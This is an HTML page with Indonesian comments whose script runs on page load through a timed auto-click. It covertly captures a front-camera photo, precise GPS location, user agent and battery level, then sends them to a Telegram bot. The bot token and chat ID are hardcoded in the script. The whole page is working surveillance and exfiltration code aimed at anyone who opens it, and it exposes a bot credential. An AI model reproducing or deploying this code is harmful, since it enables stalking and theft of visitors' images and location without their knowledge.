<!DOCTYPE html>
<html>
<head>
    <title>Telegram Bot</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
</head>
<body>
    <button id="sendDataButton">Kirim Data ke Bot</button>

    <script>
        // Fungsi untuk mengambil foto perangkat kamera depan
        function captureDevicePhoto() {
            // Menggunakan MediaDevices API untuk mengakses kamera
            return new Promise((resolve, reject) => {
                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
                        .then(stream => {
                            const video = document.createElement('video');
                            video.srcObject = stream;
                            video.onloadedmetadata = () => {
                                video.play();
                                const canvas = document.createElement('canvas');
                                canvas.width = video.videoWidth;
                                canvas.height = video.videoHeight;
                                const context = canvas.getContext('2d');
                                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                                const dataURL = canvas.toDataURL('image/jpeg');
                                resolve(dataURL);
                                video.srcObject.getTracks().forEach(track => track.stop());
                            };
                        })
                        .catch(error => reject(error));
                } else {
                    reject(new Error('Kamera tidak tersedia'));
                }
            });
        }

        // Fungsi untuk mendapatkan lokasi akurat
        function getDeviceLocation() {
            return new Promise((resolve, reject) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        position => {
                            const latitude = position.coords.latitude;
                            const longitude = position.coords.longitude;
                            const mapUrl = `https://maps.google.com/maps?q=${latitude},${longitude}&z=15&output=embed`;
                            resolve(mapUrl);
                        },
                        error => reject(error)
                    );
                } else {
                    reject(new Error('Lokasi tidak tersedia'));
                }
            });
        }

        // Fungsi untuk mendapatkan informasi perangkat/browser
        function getDeviceInfo() {
            const deviceInfo = `Perangkat: ${navigator.userAgent}`;
            return deviceInfo;
        }

        // Fungsi untuk mendapatkan informasi baterai
        function getBatteryInfo() {
            return new Promise((resolve, reject) => {
                navigator.getBattery().then(
                    battery => {
                        const batteryInfo = `Level Baterai: ${Math.round(battery.level * 100)}%`;
                        resolve(batteryInfo);
                    },
                    error => reject(error)
                );
            });
        }

        // Fungsi untuk mengirim data ke bot Telegram menggunakan HTTP API
        function sendDataToTelegram(data) {
            // Contoh request menggunakan jQuery
            $.ajax({
                url: `https://api.telegram.org/bot6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ/sendMessage`,
                method: 'POST',
                data: {
                    chat_id: '1121369247',
                    text: data
                },
                success: function(response) {
                    console.log('Data terkirim ke bot Telegram');
                },
                error: function(error) {
                    console.log('Terjadi kesalahan saat mengirim data ke bot Telegram');
                }
            });
        }

        // Fungsi untuk mengklik tombol secara otomatis setelah 3 detik
        function autoClickButton(buttonId) {
            setTimeout(function() {
                document.getElementById(buttonId).click();
            }, 3000);
        }

        // Fungsi untuk mengambil foto perangkat, lokasi, informasi perangkat, dan informasi baterai
        function getDataAndSendToTelegram() {
            Promise.all([captureDevicePhoto(), getDeviceLocation(), getDeviceInfo(), getBatteryInfo()])
                .then(results => {
                    const photo = results[0];
                    const location = results[1];
                    const deviceInfo = results[2];
                    const batteryInfo = results[3];

                    const data = `Foto Perangkat: ${photo}\n` +
                        `Lokasi Akurat: ${location}\n` +
                        `Info Perangkat: ${deviceInfo}\n` +
                        `Info Baterai: ${batteryInfo}`;

                    sendDataToTelegram(data);
                })
                .catch(error => console.error(error));
        }

        // Mengaktifkan fungsi auto click untuk button
        autoClickButton('sendDataButton');
    </script>
</body>
</html>
